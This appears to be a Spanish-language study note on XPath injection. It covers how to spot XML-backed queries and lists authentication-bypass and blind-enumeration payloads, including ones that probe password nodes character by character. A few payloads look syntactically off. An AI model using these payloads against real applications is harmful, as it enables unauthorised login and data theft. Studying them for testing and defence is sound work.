#Inyeccion
Estas inyecciones son muy similares a las SQLI, ya que el mecanismo es mas o menos el mismo. Xpath realiza las peticiones en vez de a un documente SQL, a un documento XML. 

---
### Como sabemos que hace consultas XML?
Varios indicios:
_1ro_ -> La API acepta o devuelve XML
`Content-Type: application/xml`

o XML en respuesta:

```xml
<users>
  <user>...</user>
</users>
```

---
### Payloads
Los payloads son muy similares a SQL la hora de testear:

`admin'or '1'='1'`
`' or ''='`
`x' or name()='username' or 'x'='y`
`' and count(/*)=1 and '1'='1`
`' and count(/@*)=1 and '1'='1`
`' and count(/comment())=1 and '1'='1`
`')] | //user/*[contains(*,'`
`') and contains(../password,'c`
`') and starts-with(../password,'c`

---
### Que hacemos una vez q sabemos q es vulnerable

Vamos a intentar descubrir la arquitectura XML:

```bash
'and name(*/[1])='users
'and substring(name(*/[1]),1,1)='Z
```

Con el primer payload, le decimos:_"Y el nombre de la etiqueta raiz (/\*[1])" es igual a users"_
Con el segundo le decimos: _"Y dentro de el nombre de la etiqueta raiz, hay una substring que es igual a Z"_

_*/[1]_ --> Raiz del documento XML 
_,1_ -> Empezar desde el primer caracter --> Este numerito se va iterando a la hora de hacer BF (_empeza del 2do caracter, del 3ro, del 4to, etc..._)
_,1_ -> Tomar solo un caracter

```bash
'and name(/*[1]/*[1])'
'and substring(name(/*[1]/*[2]),1,1)='Z
```

- `/*[1]` → nodo raíz (sin poner el nombre de la raiz)
- `/*[1]/*[1]` → primer hijo del nodo raíz
- `name(/*[1]/*[1])` → devuelve el nombre de ese hijo (`type` en tu ejemplo)
- El segundo payload dice: _"Y dentro del segundo nodo de la raiz, empeza por el primer caracter y contestame solo si el primer caracter es igual a Z "_.

Basicamente va incrementandose:

```
'and name(/*[1]/*[2]/*[3])'
```

_"Decime el nombre del tercer nodo hijo del segundo nodo hijo de la raiz "_ --> Se puede iterar los numeros para ir enumerando cada nodo.